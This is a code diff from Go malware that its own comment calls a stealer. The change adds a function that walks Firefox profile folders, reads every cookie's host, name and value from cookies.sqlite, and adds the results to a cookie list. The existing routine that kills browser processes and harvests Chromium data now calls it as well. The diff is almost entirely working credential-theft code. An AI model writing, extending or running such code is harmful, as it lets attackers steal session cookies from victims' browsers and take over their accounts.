@@ -231,6 +231,49 @@ func grabChromiumData(path string, name string) error {
 	return nil
 }
 
+func grabFirefoxData(path, browserName string) {
+	profiles, err := os.ReadDir(path)
+	if err != nil {
+		return
+	}
+
+	for _, profile := range profiles {
+		if !profile.IsDir() {
+			continue
+		}
+		profilePath := path + `\` + profile.Name()
+		db, err := sql.Open("sqlite3", profilePath+`\cookies.sqlite`)
+		if err != nil {
+			continue
+		}
+
+		rows, err := db.Query(`SELECT host, name, value FROM moz_cookies`)
+		if err != nil {
+			_ = db.Close()
+			continue
+		}
+
+		for rows.Next() {
+			var host, name, value string
+			if err := rows.Scan(&host, &name, &value); err != nil {
+				continue
+			}
+			if value != "" {
+				cookies = append(cookies, BrowserCookieResult{
+					URL:  host,
+					Name: name,
+					// Yes, Firefox cookies are not encrypted. I learned it by doing this stealer,
+					// and it's actually crazy that they don't encrypt cookies at all
+					Value:       value,
+					BrowserName: browserName,
+				})
+			}
+		}
+		_ = rows.Close()
+		_ = db.Close()
+	}
+}
+
 func GrabBrowsersData() {
 	_ = killBrowserProcesses()
 
@@ -239,5 +282,12 @@ func GrabBrowsersData() {
 			continue
 		}
 		grabChromiumData(path, name)
+	}
+
+	for name, path := range FirefoxPaths {
+		if _, err := os.Stat(path); os.IsNotExist(err) {
+			continue
+		}
+		grabFirefoxData(path, name)
 	}
 }
